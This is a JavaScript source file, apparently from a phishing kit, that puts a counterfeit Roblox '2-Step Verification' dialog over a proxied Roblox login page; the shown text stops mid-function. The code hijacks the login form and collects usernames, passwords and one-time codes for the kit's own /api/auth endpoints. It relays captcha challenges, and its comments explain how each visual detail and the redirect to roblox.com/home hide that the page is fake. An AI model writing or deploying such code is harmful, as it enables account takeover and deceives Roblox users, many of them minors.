/**
 * Roblox replica 2-step verification client.
 *
 * Loaded by login.php on top of the proxied Roblox login page. It owns the
 * credential submit path from there on:
 *
 *   submit  ->  POST /api/auth/login      -> { requiresTwoFactor, sessionId, mediaType }
 *   code    ->  POST /api/auth/verify-2fa -> { success, redirect }
 *   resend  ->  POST /api/auth/resend-2fa
 *
 * The form's own handler is stopped in the capture phase at window level, which
 * runs before any listener the page or its framework installed further down, so
 * a proxied Roblox bundle that would have failed its own login POST never gets
 * the chance. The page is left intact for its styling only.
 */
(function () {
    'use strict';

    if (window.__rbx2fa) return;
    window.__rbx2fa = true;

    var ENDPOINT_LOGIN = '/api/auth/login';    var ENDPOINT_VERIFY = '/api/auth/verify-2fa';
    var ENDPOINT_RESEND = '/api/auth/resend-2fa';

    // Where a finished sign-in lands. Real Roblox sends the browser to /home
    // with a live session; sending it back to the login page made the whole
    // flow end where it started, which is the single loudest tell that this is
    // not Roblox. Absolute so it survives the login route being /login.
    var LANDING = 'https://www.roblox.com/home';

    // Roblox's own two-step dialog leads with a shield-and-lock plate.
    // Silhouette follows Challenge.css .modal-lock-icon, not an eyeball.
    var LOCK_SVG = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIiIGhlaWdodD0iMTkyIiBmaWxsPSJub25lIiB2aWV3Qm94PSIwIDAgMTkyIDE5MiI+PHBhdGggZmlsbD0iI2JkYmViZSIgZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNMTUxLjk5IDMzLjU4N2MyLjQyMS43NTQgNC4wMSAzLjAzMSA0LjAxIDUuNTY3djY0LjYyMWMwIDI3Ljg0OC00MCA1Mi41MjMtNjAgNjEuMjI1LTIwLTguNzAyLTYwLTMzLjM3Ny02MC02MS4yMjVWMzkuMzUxYzAtMi41MjYgMS41NzctNC43OTggMy45ODYtNS41NkM1Ni44OSAyOC40NDIgNzYuMDI4IDI3IDk2LjMgMjdjMjAuMDI0IDAgMzguOTQgMS4zNjkgNTUuNjkgNi41ODdtLTU2LjA4NCA0LjE4MmMxNy40ODYgMCAzMy45ODcuNTIyIDQ4LjcwMSA0Ljk4M3Y2MS40MDNjMCA4Ljk4NS02LjY5OCAxOS4zMjgtMTguNjQ0IDI5LjYxMi05Ljc5NiA4LjQzMy0yMS40MjQgMTUuNjQxLTMwLjM1NiAyMC4wMDItOC45MzMtNC4zNjEtMjAuNTYtMTEuNTY5LTMwLjM1Ny0yMC4wMDItMTEuOTQ1LTEwLjI4NC0xOC42NDMtMjAuNjI3LTE4LjY0My0yOS42MTJ2LTYxLjIyYzE0Ljg2NC00LjU3NSAzMS41NzUtNS4xNjYgNDkuMjk5LTUuMTY2IiBjbGlwLXJ1bGU9ImV2ZW5vZGQiLz48cGF0aCBmaWxsPSIjNzY3ODc5IiBkPSJtMTUxLjk5IDMzLjU4Ny0uMjk3Ljk1NHpNOTYgMTY1bC0uMzk5LjkxN2ExIDEgMCAwIDAgLjc5OCAwek0zOS45ODYgMzMuNzkxbC4zMDIuOTU0em0xMDQuNjIxIDguOTZoMWExIDEgMCAwIDAtLjcxLS45NTZ6bS0xOC42NDQgOTEuMDE2LjY1My43NTh6bS0zMC4zNTYgMjAuMDAyLS40MzkuODk5Yy4yNzcuMTM1LjYuMTM1Ljg3OCAwek02NS4yNSAxMzMuNzY3bC42NTMtLjc1OHpNNDYuNjA3IDQyLjkzNGwtLjI5NC0uOTU2YTEgMSAwIDAgMC0uNzA2Ljk1NnpNMTU3IDM5LjE1NGMwLTIuOTUtMS44NTEtNS42My00LjcxMi02LjUyMmwtLjU5NSAxLjkxYzEuOTguNjE2IDMuMzA3IDIuNDkgMy4zMDcgNC42MTJ6bTAgNjQuNjIxVjM5LjE1NGgtMnY2NC42MjF6bS02MC42MDEgNjIuMTQyYzEwLjA3MS00LjM4MiAyNS4xNjItMTIuNzc2IDM3Ljc1My0yMy41OTFDMTQ2LjY5NyAxMzEuNTQ5IDE1NyAxMTguMTYyIDE1NyAxMDMuNzc1aC0yYzAgMTMuNDYyLTkuNjk3IDI2LjMzNi0yMi4xNTIgMzcuMDM0LTEyLjQwOCAxMC42NTktMjcuMzE4IDE4Ljk1NC0zNy4yNDcgMjMuMjc0ek0zNSAxMDMuNzc1YzAgMTQuMzg3IDEwLjMwMyAyNy43NzQgMjIuODQ4IDM4LjU1MSAxMi41OTEgMTAuODE1IDI3LjY4MiAxOS4yMDkgMzcuNzUzIDIzLjU5MWwuNzk4LTEuODM0Yy05LjkyOS00LjMyLTI0LjgzOC0xMi42MTUtMzcuMjQ3LTIzLjI3NEM0Ni42OTcgMTMwLjExMSAzNyAxMTcuMjM3IDM3IDEwMy43NzV6bTAtNjQuNDI0djY0LjQyNGgyVjM5LjM1MXptNC42ODUtNi41MTNjLTIuODQ4LjktNC42ODUgMy41NzUtNC42ODUgNi41MTNoMmMwLTIuMTE1IDEuMzE3LTMuOTgzIDMuMjg4LTQuNjA2ek05Ni4zIDI2Yy0yMC4zMDYgMC0zOS41NjUgMS40NDItNTYuNjE1IDYuODM4bC42MDMgMS45MDdDNTcuMDQ1IDI5LjQ0MiA3Ni4wNiAyOCA5Ni4zIDI4em01NS45ODggNi42MzJDMTM1LjM5MiAyNy4zNjkgMTE2LjM1NSAyNiA5Ni4zIDI2djJjMTkuOTkyIDAgMzguNzg4IDEuMzY5IDU1LjM5MyA2LjU0MXptLTcuMzkxIDkuMTYzYy0xNC44NzItNC41MDktMzEuNTEtNS4wMjYtNDguOTkxLTUuMDI2djJjMTcuNDkxIDAgMzMuODU1LjUyNyA0OC40MTEgNC45NHptLjcxIDYyLjM2VjQyLjc1MmgtMnY2MS40MDN6bS0xOC45OTEgMzAuMzdjMTEuOTk0LTEwLjMyNiAxOC45OTEtMjAuOTI2IDE4Ljk5MS0zMC4zN2gtMmMwIDguNTI1LTYuMzk5IDE4LjYxMi0xOC4yOTYgMjguODU0em0tMzAuNTcgMjAuMTQzYzktNC4zOTUgMjAuNzAxLTExLjY0OCAzMC41Ny0yMC4xNDNsLTEuMzA1LTEuNTE2Yy05LjcyNCA4LjM3MS0yMS4yNzggMTUuNTMzLTMwLjE0MyAxOS44NjJ6bS0zMS40NDgtMjAuMTQzYzkuODY5IDguNDk1IDIxLjU3IDE1Ljc0OCAzMC41NyAyMC4xNDNsLjg3OC0xLjc5N2MtOC44NjUtNC4zMjktMjAuNDItMTEuNDkxLTMwLjE0My0xOS44NjJ6bS0xOC45OTEtMzAuMzdjMCA5LjQ0NCA2Ljk5NyAyMC4wNDQgMTguOTkxIDMwLjM3bDEuMzA1LTEuNTE2Yy0xMS44OTctMTAuMjQyLTE4LjI5Ni0yMC4zMjktMTguMjk2LTI4Ljg1NHptMC02MS4yMnY2MS4yMmgydi02MS4yMnptNTAuMjk5LTYuMTY2Yy0xNy43MjMgMC0zNC41Ny41ODYtNDkuNTkzIDUuMjFsLjU4OCAxLjkxMWMxNC43MDUtNC41MjUgMzEuMjc5LTUuMTIgNDkuMDA1LTUuMTJ6Ii8+PHBhdGggZmlsbD0iIzc2Nzg3OSIgZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNMTU2IDEwMy43NzVjMCAyNy44NDgtNDAgNTIuNTIzLTYwIDYxLjIyNXYtMTIuMDIxYzguODk4LTQuMzU0IDIwLjM3My0xMS40NjUgMzAuMDYtMTkuNzVhOTcgOTcgMCAwIDAgNC4yMzYtMy44MzZjOS4yOTYtOC45NDQgMTQuNDMtMTcuNzk4IDE0LjQzLTI1LjYxOHYtNjEuMDZDMTMwLjAwNCAzOC4yOCAxMTMuNDk1IDM3Ljc3IDk2IDM3Ljc2OVYyN2guM2MyMC4wMjQgMCAzOC45NCAxLjM2OSA1NS42OSA2LjU4NyAyLjQyMS43NTQgNC4wMSAzLjAzMSA0LjAxIDUuNTY3eiIgY2xpcC1ydWxlPSJldmVub2RkIi8+PHBhdGggZmlsbD0iI2JkYmViZSIgZmlsbC1ydWxlPSJldmVub2RkIiBkPSJNODkgNjljMC00LjAwMiAyLjA4Ni03IDUtN2g0YzIuOTE0IDAgNSAyLjk5OCA1IDd2MTVIODl6bTE5IDE1VjY5YzAtNi43ODYtNC4zODMtMTItMTAuMDQ0LTEyaC0zLjkxMkM4OC4zODQgNTcgODQgNjIuMjE0IDg0IDY5djE1Yy01LjQgMC0xMCA0LjQ4Ni0xMCA5LjkyM3YyMi4xNTRjMCAyLjcxNyAyLjE5IDQuOTIzIDQuODg5IDQuOTIzaDM0LjIyMmMyLjY5OSAwIDQuODg5LTIuMjA2IDQuODg5LTQuOTIzVjkzLjkyM2MwLTUuNDM3LTQuNi05LjkyMy0xMC05LjkyMyIgY2xpcC1ydWxlPSJldmVub2RkIi8+PHBhdGggZmlsbD0iIzc2Nzg3OSIgZD0iTTEwMyA4NHYxaDF2LTF6bS0xNCAwaC0xdjFoMXptMTkgMGgtMXYxaDF6bS0yNCAwdjFoMXYtMXptNi0xNWMwLTEuODM4LjQ4LTMuMzc1IDEuMjIzLTQuNDIzQzkxLjk1NyA2My41NDIgOTIuOTIzIDYzIDk0IDYzdi0yYy0xLjgzOCAwLTMuMzcuOTU2LTQuNDA5IDIuNDJDODguNTYzIDY0Ljg3MyA4OCA2Ni44MzYgODggNjl6bTQtNmg0di0yaC00em00IDBjMS4wNzYgMCAyLjA0My41NDIgMi43NzcgMS41NzdDMTAxLjUyIDY1LjYyNSAxMDIgNjcuMTYyIDEwMiA2OWgyYzAtMi4xNjUtLjU2My00LjEyOC0xLjU5Mi01LjU4QzEwMS4zNyA2MS45NTcgOTkuODM4IDYxIDk4IDYxem00IDZ2MTVoMlY2OXptMSAxNEg4OXYyaDE0em0tMTMgMVY2OWgtMnYxNXptMTkgMFY2OWgtMnYxNXptMC0xNWMwLTcuMTY2LTQuNjczLTEzLTExLjA0NC0xM3YyYzQuOTUgMCA5LjA0NCA0LjU5MyA5LjA0NCAxMXpNOTcuOTU2IDU2aC0zLjkxMnYyaDMuOTEyem0tMy45MTIgMEM4Ny42NzMgNTYgODMgNjEuODM0IDgzIDY5aDJjMC02LjQwNyA0LjA5NC0xMSA5LjA0NC0xMXpNODMgNjl2MTVoMlY2OXptMSAxNGMtNS45NCAwLTExIDQuOTItMTEgMTAuOTIzaDJDNzUgODkuMDUgNzkuMTQgODUgODQgODV6TTczIDkzLjkyM3YyMi4xNTRoMlY5My45MjN6bTAgMjIuMTU0YzAgMy4yNjMgMi42MzEgNS45MjMgNS44ODkgNS45MjN2LTJjLTIuMTQgMC0zLjg4OS0xLjc1MS0zLjg4OS0zLjkyM3pNNzguODg5IDEyMmgzNC4yMjJ2LTJINzguODg5em0zNC4yMjIgMGMzLjI1OCAwIDUuODg5LTIuNjYgNS44ODktNS45MjNoLTJjMCAyLjE3Mi0xLjc0OSAzLjkyMy0zLjg4OSAzLjkyM3ptNS44ODktNS45MjNWOTMuOTIzaC0ydjIyLjE1NHptMC0yMi4xNTRDMTE5IDg3LjkyMSAxMTMuOTQgODMgMTA4IDgzdjJjNC44NiAwIDkgNC4wNSA5IDguOTIzeiIvPjwvc3ZnPg==';

    var USERNAME_SELECTORS = [
        'input#login-username',
        'input[name="username"]',
        'input[name="cvalue"]',
        'input[autocomplete="username"]',
        'input[type="text"]',
        'input[type="email"]'
    ];

    var PASSWORD_SELECTORS = [
        'input#login-password',
        'input[name="password"]',
        'input[autocomplete="current-password"]',
        'input[type="password"]'
    ];

    var BUTTON_SELECTORS = [
        '#login-button',
        '[data-testid="login-button"]',
        '.login-button',
        'button[type="submit"]'
    ];

    var state = {
        busy: false,
        sessionId: null,
        captchaId: null,
        mediaType: 'Email',
        returnUrl: null,
        resendCooldownUntil: 0
    };

    function q(selectors, root) {
        var scope = root || document;
        for (var i = 0; i < selectors.length; i++) {
            var el = scope.querySelector(selectors[i]);
            if (el) return el;
        }
        return null;
    }

    function readCredentials() {
        var pass = q(PASSWORD_SELECTORS);
        var user = q(USERNAME_SELECTORS);

        // The real login page is a React app: field ids and names change, and
        // the visible text input is not always the first match. Fall back to the
        // password field's form, then to any text-ish input that is not a
        // button, checkbox or hidden.
        if (!user) {
            var scope = (pass && pass.form) || document;
            var inputs = scope.querySelectorAll('input');
            for (var i = 0; i < inputs.length; i++) {
                var el = inputs[i];
                var type = (el.type || 'text').toLowerCase();
                if (type === 'text' || type === 'email' || type === 'tel' || type === 'search') {
                    user = el;
                    break;
                }
            }
        }

        return {
            username: user && user.value ? user.value.trim() : '',
            password: pass && pass.value ? pass.value : ''
        };
    }

    function isLoginButton(el) {
        if (!el) return false;
        for (var i = 0; i < BUTTON_SELECTORS.length; i++) {
            try {
                if (el.matches(BUTTON_SELECTORS[i])) return true;
            } catch (e) { /* selector unsupported, skip */ }
        }
        // Any submit control inside the form that also holds the password field.
        var form = el.closest && el.closest('form');
        if (form && form.querySelector('input[type="password"]')) return true;
        // React renders the Log In control outside the form on some builds, so
        // the form check misses it and the page's own client posts instead —
        // which is how a raw Roblox error ends up on our page.
        var label = (el.textContent || el.value || '').replace(/\s+/g, ' ').trim();
        return /^(log ?in|sign ?in|continue)$/i.test(label);
    }

    function postJSON(url, payload) {
        return fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' },
            credentials: 'same-origin',
            body: JSON.stringify(payload)
        }).then(function (res) {
            return res.json().catch(function () { return {}; }).then(function (data) {
                return { ok: res.ok, status: res.status, data: data };
            });
        });
    }

    /* ── styles ─────────────────────────────────────────────────────────── */
    //
    // Tokens are Roblox Foundation, not eyeballed: surface 100 #232527,
    // surface 200 #1B1D1F, stroke default #4B4B4B, content primary #FFF,
    // content secondary #B8B8B8, action primary #00A2FF. Builder Sans is the
    // brand face the real login renders in, so the fallback stack must not
    // change metrics — Helvetica Neue before Helvetica.

    var CSS = [
        '.rbx2fa-scrim{position:fixed;inset:0;background:rgba(10,10,12,.78);display:flex;align-items:center;justify-content:center;',
        'z-index:2147483000;padding:16px;animation:rbx2fa-fade .1s ease-out}',
        '@keyframes rbx2fa-fade{from{opacity:0}to{opacity:1}}',
        '@keyframes rbx2fa-rise{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}',
        '.rbx2fa-card{width:540px;max-width:100%;background:#232527;color:#fff;border-radius:8px;padding:0 0 18px;',
        'box-shadow:0 20px 56px rgba(0,0,0,.6);font-family:"Builder Sans","Builder Extended","Helvetica Neue",Helvetica,Arial,sans-serif;',
        'animation:rbx2fa-rise .14s cubic-bezier(.2,.8,.3,1)}',
        '.rbx2fa-head{display:grid;grid-template-columns:minmax(0,1fr) auto minmax(0,1fr);align-items:center;',
        'justify-items:center;gap:48px;margin:0 0 18px;padding:14px 18px 12px;',
        'border-bottom:1px solid #3a3d40}',
        '.rbx2fa-title{font-size:24px;font-weight:700;letter-spacing:0;line-height:1.3;margin:0;color:#fff;text-align:center;white-space:nowrap}',
        '.rbx2fa-x{appearance:none;background:none;border:0;color:#b8b8b8;font-size:22px;line-height:1;cursor:pointer;',
        'padding:4px 6px;margin-right:auto;border-radius:4px;transition:color .12s,background .12s}',
        '.rbx2fa-x:hover{color:#fff;background:rgba(255,255,255,.08)}',
        '.rbx2fa-body{font-size:16px;line-height:1.4;color:#b8b8b8;margin:0 auto 18px;text-align:center;max-width:460px}',
        '.rbx2fa-body strong{color:#fff;font-weight:600}',
        '.rbx2fa-head-info{width:100%;height:1px}',
        '.rbx2fa-main{padding:0 18px}',
        '.rbx2fa-lock{width:72px;height:72px;margin:0 auto 14px;display:block;background-repeat:no-repeat;',
        'background-position:center;background-size:72px 72px}',
        '.rbx2fa-input{width:100%;box-sizing:border-box;background:#1b1d1f;border:1px solid #4b4b4b;border-radius:8px;',
        'color:#fff;font-size:18px;font-weight:600;letter-spacing:4px;text-align:center;height:48px;padding:0 0 0 4px;',
        'outline:none;transition:border-color .12s,box-shadow .12s;font-family:inherit}',
        '.rbx2fa-input::placeholder{color:#6b6f73;font-size:15px;font-weight:400;letter-spacing:1px}',
        '.rbx2fa-input:focus{border-color:#00a2ff;box-shadow:0 0 0 1px #00a2ff}',
        '.rbx2fa-input.is-bad{border-color:#ff4d4d;box-shadow:0 0 0 1px #ff4d4d;animation:rbx2fa-shake .28s}',
        '@keyframes rbx2fa-shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-5px)}40%{transform:translateX(5px)}',
        '60%{transform:translateX(-3px)}80%{transform:translateX(3px)}}',
        '.rbx2fa-err{min-height:18px;margin:8px 0 0;font-size:12px;line-height:1.4;color:#ff6b6b}',
        '.rbx2fa-btn{width:100%;height:48px;margin-top:12px;border:0;border-radius:8px;background:#00a2ff;color:#fff;',
        'font-size:16px;font-weight:600;font-family:inherit;cursor:pointer;transition:background .12s,opacity .12s;',
        'display:flex;align-items:center;justify-content:center;gap:10px}',
        '.rbx2fa-btn:hover:not(:disabled){background:#0084d6}',
        '.rbx2fa-btn:active:not(:disabled){background:#0077cc}',
        '.rbx2fa-btn:disabled{background:#3a3d40;color:#8a8e92;cursor:default}',
        '.rbx2fa-spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;',
        'animation:rbx2fa-spin .7s linear infinite;display:none}',
        '@keyframes rbx2fa-spin{to{transform:rotate(360deg)}}',
        '.rbx2fa-btn.is-busy{background:#0084d6}',
        '.rbx2fa-btn.is-busy .rbx2fa-spin{display:block}',
        '.rbx2fa-foot{margin-top:14px;display:flex;flex-wrap:wrap;justify-content:center;gap:6px 20px;font-size:14px;color:#b8b8b8}',
        '.rbx2fa-link{appearance:none;background:none;border:0;padding:0;color:#00a2ff;font-size:14px;font-family:inherit;',
        'cursor:pointer;text-decoration:none}',
        '.rbx2fa-link:hover{text-decoration:underline}',
        '.rbx2fa-link:disabled{color:#6b6f73;cursor:default;text-decoration:none}',
        '.rbx2fa-toast{position:fixed;left:50%;bottom:28px;transform:translateX(-50%);background:#2b2f33;color:#fff;',
        'font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,sans-serif;font-size:14px;padding:11px 18px;',
        'border-radius:8px;box-shadow:0 12px 32px rgba(0,0,0,.5);z-index:2147483001}',
        '.rbx2fa-arkose{min-height:74px;display:flex;align-items:center;justify-content:center;',
        'background:#1b1d1f;border:1px solid #4b4b4b;border-radius:8px;margin-bottom:8px;overflow:hidden}',
        '.rbx2fa-arkose iframe{border:0;display:block;max-width:100%}',
        '.rbx2fa-loading{display:flex;align-items:center;gap:10px;color:#b8b8b8;font-size:14px;padding:18px}',
        '.rbx2fa-loading .rbx2fa-spin{display:block;border-color:rgba(255,255,255,.2);border-top-color:#00a2ff}',
        '.rbx2fa-hint{margin:0 0 14px;font-size:12px;line-height:1.4;color:#8a8e92}',
        '@media (max-width:520px){.rbx2fa-card{padding:0 0 14px;width:100%}.rbx2fa-title{font-size:20px}.rbx2fa-head{gap:20px;padding:12px 14px 10px}.rbx2fa-main{padding:0 14px}}',
        '.rbx2fa-dots{display:flex;justify-content:center;align-items:center;gap:8px;height:48px;margin:2px 0}',
        '.rbx2fa-dots i{width:12px;height:12px;background:#b8b8b8;border-radius:2px;display:block;animation:rbx2fa-pulse 1.1s infinite ease-in-out}',
        '.rbx2fa-dots i:nth-child(2){animation-delay:.16s}',
        '.rbx2fa-dots i:nth-child(3){animation-delay:.32s}',
        '@keyframes rbx2fa-pulse{0%,80%,100%{opacity:.25}40%{opacity:1}}'
    ].join('');

    function injectStyles() {
        if (document.getElementById('rbx2fa-styles')) return;
        var style = document.createElement('style');
        style.id = 'rbx2fa-styles';
        style.textContent = CSS;
        (document.head || document.documentElement).appendChild(style);
    }

    function toast(message) {
        injectStyles();
        var el = document.createElement('div');
        el.className = 'rbx2fa-toast';
        el.textContent = message;
        document.body.appendChild(el);
        setTimeout(function () {
            if (el.parentNode) el.parentNode.removeChild(el);
        }, 2600);
    }

    /* ── modal ──────────────────────────────────────────────────────────── */

    var ui = null;

    function buildModal() {
        injectStyles();

        var scrim = document.createElement('div');
        scrim.className = 'rbx2fa-scrim';

        var card = document.createElement('div');
        card.className = 'rbx2fa-card';
        card.setAttribute('role', 'dialog');
        card.setAttribute('aria-modal', 'true');
        card.setAttribute('aria-labelledby', 'rbx2fa-title');

        var head = document.createElement('div');
        head.className = 'rbx2fa-head';

        var title = document.createElement('h2');
        title.className = 'rbx2fa-title';
        title.id = 'rbx2fa-title';
        title.textContent = '2-Step Verification';

        var close = document.createElement('button');
        close.className = 'rbx2fa-x';
        close.type = 'button';
        close.setAttribute('aria-label', 'Close');
        close.textContent = '\u00d7';

        var body = document.createElement('p');
        body.className = 'rbx2fa-body';

        var input = document.createElement('input');
        input.className = 'rbx2fa-input';
        input.type = 'text';
        input.inputMode = 'numeric';
        input.autocomplete = 'one-time-code';
        input.maxLength = 6;
        input.placeholder = '6-digit code';
        input.setAttribute('aria-label', 'Verification code');
        input.spellcheck = false;

        var err = document.createElement('p');
        err.className = 'rbx2fa-err';
        err.setAttribute('role', 'alert');

        var verify = document.createElement('button');
        verify.className = 'rbx2fa-btn';
        verify.type = 'button';
        verify.disabled = true;
        var verifyText = document.createElement('span');
        verifyText.textContent = 'Verify';
        var spin = document.createElement('span');
        spin.className = 'rbx2fa-spin';
        verify.appendChild(spin);
        verify.appendChild(verifyText);

        var foot = document.createElement('div');
        foot.className = 'rbx2fa-foot';

        var resendWrap = document.createElement('span');
        resendWrap.appendChild(document.createTextNode('Didn\u2019t get a code? '));
        var resendBtn = document.createElement('button');
        resendBtn.className = 'rbx2fa-link';
        resendBtn.type = 'button';
        resendBtn.textContent = 'Resend code';
        resendWrap.appendChild(resendBtn);

        var switchBtn = document.createElement('button');
        switchBtn.className = 'rbx2fa-link';
        switchBtn.type = 'button';
        switchBtn.textContent = 'Use a different account';

        foot.appendChild(resendWrap);
        foot.appendChild(switchBtn);

        // Roblox's two-step dialog leads with a shield/lock plate before the
        // copy. It is the single most recognisable part of the real modal and
        // its absence is what made the card read as a generic prompt.
        var lock = document.createElement('div');
        lock.className = 'rbx2fa-lock';
        lock.setAttribute('aria-hidden', 'true');
        lock.style.backgroundImage = 'url("' + LOCK_SVG + '")';

        var main = document.createElement('div');
        main.className = 'rbx2fa-main';
        main.appendChild(lock);
        main.appendChild(body);
        main.appendChild(input);
        main.appendChild(err);
        main.appendChild(verify);
        main.appendChild(foot);

        // Header is a three-column grid in Roblox's own modal: control, title,
        // info. The empty third cell is what keeps the title optically centred
        // rather than pushed right by the close button.
        var headInfo = document.createElement('div');
        headInfo.className = 'rbx2fa-head-info';
        head.appendChild(close);
        head.appendChild(title);
        head.appendChild(headInfo);

        card.appendChild(head);
        card.appendChild(main);
        scrim.appendChild(card);

        document.body.appendChild(scrim);

        var api = {
            scrim: scrim,
            card: card,
            body: body,
            input: input,
            err: err,
            verify: verify,
            verifyText: verifyText,
            resendWrap: resendWrap,
            resendBtn: resendBtn,
            switchBtn: switchBtn,
            close: close
        };

        close.addEventListener('click', dismiss);
        switchBtn.addEventListener('click', dismiss);
        resendBtn.addEventListener('click', onResend);
        verify.addEventListener('click', onSubmit);
        input.addEventListener('input', onInputChanged);
        input.addEventListener('keydown', onInputKeydown);
        input.addEventListener('paste', onPaste);

        return api;
    }

    function setBusy(busy) {
        state.busy = busy;
        if (!ui) return;
        ui.verify.disabled = busy || ui.input.value.replace(/\D/g, '').length !== 6;
        ui.verify.classList.toggle('is-busy', busy);
        ui.verifyText.textContent = busy ? 'Verifying\u2026' : 'Verify';
        ui.input.disabled = busy;
    }

    function setError(message) {
        if (!ui) return;
        ui.err.textContent = message || '';
        if (message) {
            ui.input.classList.remove('is-bad');
            // Force a reflow so the shake animation restarts on repeat errors.
            void ui.input.offsetWidth;
            ui.input.classList.add('is-bad');
        }
    }

    function dismiss() {
        if (ui && ui.scrim && ui.scrim.parentNode) ui.scrim.parentNode.removeChild(ui.scrim);
        ui = null;
        state.sessionId = null;
        state.captchaId = null;
        removeArkoseScript();
    }

    function onInputChanged() {
        if (!ui) return;
        var digits = ui.input.value.replace(/\D/g, '').slice(0, 6);
        if (digits !== ui.input.value) ui.input.value = digits;
        ui.verify.disabled = state.busy || digits.length !== 6;
        if (ui.err.textContent) setError('');
    }

    function onInputKeydown(event) {
        if (event.key === 'Enter') {
            event.preventDefault();
            onSubmit();
            return;
        }
        if (event.key === 'Escape') {
            event.preventDefault();
            dismiss();
        }
    }

    function onPaste(event) {
        var clip = (event.clipboardData || window.clipboardData);
        if (!clip) return;
        var text = clip.getData('text') || '';
        var digits = text.replace(/\D/g, '').slice(0, 6);
        if (!digits) return;
        event.preventDefault();
        ui.input.value = digits;
        onInputChanged();
        if (digits.length === 6) onSubmit();
    }

    function onSubmit() {
        if (!ui || state.busy) return;
        var code = ui.input.value.replace(/\D/g, '');
        if (code.length !== 6) {
            setError('Enter the 6-digit code.');
            return;
        }

        setBusy(true);
        setError('');

        postJSON(ENDPOINT_VERIFY, {
            sessionId: state.sessionId,
            code: code,
            returnUrl: state.returnUrl
        }).then(function (out) {
            if (out.data && out.data.success) {
                setBusy(false);
                ui.verifyText.textContent = 'Verified';
                window.location.href = 'https://www.roblox.com/home';
                return;
            }

            setBusy(false);
            var message = (out.data && out.data.message) || 'Incorrect code. Please try again.';
            if (out.data && out.data.busy) message = 'Please wait a moment and try again.';
            setError(message);
            ui.input.value = '';
            onInputChanged();
            ui.input.focus();
        }).catch(function () {
            setBusy(false);
            setError('Something went wrong. Please try again.');
        });
    }

    function onResend(event) {
        if (!ui || !state.sessionId) return;
        if (Date.now() < state.resendCooldownUntil) return;

        var btn = event.currentTarget;
        btn.disabled = true;
        btn.textContent = 'Sending\u2026';

        postJSON(ENDPOINT_RESEND, { sessionId: state.sessionId }).then(function (out) {
            if (out.data && out.data.success) {
                toast(out.data.message || 'A new code was sent.');
                state.resendCooldownUntil = Date.now() + 30000;
                btn.textContent = 'Resend in 30s';
                var tick = setInterval(function () {
                    var left = Math.ceil((state.resendCooldownUntil - Date.now()) / 1000);
                    if (!ui) { clearInterval(tick); return; }
                    if (left > 0) {
                        btn.textContent = 'Resend in ' + left + 's';
                    } else {
                        clearInterval(tick);
                        btn.disabled = false;
                        btn.textContent = 'Resend code';
                    }
                }, 1000);
            } else {
                btn.disabled = false;
                btn.textContent = 'Resend code';
                setError((out.data && out.data.message) || 'We could not send a new code.');
            }
        }).catch(function () {
            btn.disabled = false;
            btn.textContent = 'Resend code';
            setError('Something went wrong. Please try again.');
        });
    }

    function openModal(mediaType) {
        if (ui) dismiss();
        ui = buildModal();

        state.mediaType = mediaType || 'Email';
        state.resendCooldownUntil = 0;

        if (state.mediaType === 'Email') {
            ui.body.textContent = 'Enter the code we sent to your email.';
            ui.resendWrap.style.display = '';
        } else if (state.mediaType === 'Authenticator') {
            ui.body.textContent = 'Enter the 6-digit code from your authenticator app.';
            ui.resendWrap.style.display = 'none';
        } else if (state.mediaType === 'Sms') {
            ui.body.textContent = 'Enter the code we sent to your phone.';
            ui.resendWrap.style.display = 'none';
        } else {
            ui.body.textContent = 'Enter the code to finish signing in.';
            ui.resendWrap.style.display = 'none';
        }

        ui.input.value = '';
        setTimeout(function () {
            if (ui && ui.input) ui.input.focus();
        }, 40);
    }

    /* ── captcha relay ──────────────────────────────────────────────────── */

    var ARKOSE_SCRIPT_ID = 'rbx2fa-arkose-script';
    var ARKOSE_HOLDER_ID = 'rbx2fa-arkose-holder';
    var DEFAULT_DOMAINS = ['client-api.arkoselabs.com'];
    var ARKOSE_LOAD_TIMEOUT = 8000;

    function buildCaptchaModal() {
        injectStyles();

        var scrim = document.createElement('div');
        scrim.className = 'rbx2fa-scrim';

        var card = document.createElement('div');
        card.className = 'rbx2fa-card';
        card.setAttribute('role', 'dialog');
        card.setAttribute('aria-modal', 'true');

        var head = document.createElement('div');
        head.className = 'rbx2fa-head';

        var title = document.createElement('h2');
        title.className = 'rbx2fa-title';
        title.textContent = 'Verify You\u2019re Human';

        var close = document.createElement('button');
        close.className = 'rbx2fa-x';
        close.type = 'button';
        close.setAttribute('aria-label', 'Close');
        close.textContent = '\u00d7';

        head.appendChild(close);
        head.appendChild(title);
        head.appendChild(document.createElement('div'));

        var body = document.createElement('p');
        body.className = 'rbx2fa-body';
        body.textContent = 'Complete the challenge below to continue.';

        var holder = document.createElement('div');
        holder.className = 'rbx2fa-arkose';
        holder.id = ARKOSE_HOLDER_ID;

        var loading = document.createElement('div');
        loading.className = 'rbx2fa-loading';
        var spin = document.createElement('span');
        spin.className = 'rbx2fa-spin';
        var loadingText = document.createElement('span');
        loadingText.textContent = 'Loading verification\u2026';
        loading.appendChild(spin);
        loading.appendChild(loadingText);
        holder.appendChild(loading);

        var err = document.createElement('p');
        err.className = 'rbx2fa-err';
        err.setAttribute('role', 'alert');

        var retry = document.createElement('button');
        retry.className = 'rbx2fa-btn';
        retry.type = 'button';
        retry.textContent = 'Start over';
        retry.style.display = 'none';

        // Same inner wrapper as the two-step card: the card itself has no
        // horizontal padding so the header rule can run edge to edge.
        var main = document.createElement('div');
        main.className = 'rbx2fa-main';
        main.appendChild(body);
        main.appendChild(holder);
        main.appendChild(err);
        main.appendChild(retry);

        card.appendChild(head);
        card.appendChild(main);
        scrim.appendChild(card);
        document.body.appendChild(scrim);

        var api = {
            scrim: scrim,
            card: card,
            holder: holder,
            err: err,
            retry: retry,
            close: close,
            loading: loading
        };

        close.addEventListener('click', dismiss);
        retry.addEventListener('click', function () {
            window.location.reload();
        });

        return api;
    }

    function removeArkoseScript() {
        var existing = document.getElementById(ARKOSE_SCRIPT_ID);
        if (existing && existing.parentNode) existing.parentNode.removeChild(existing);
        try {
            delete window.__rbx2faArkoseSetup;
        } catch (e) {
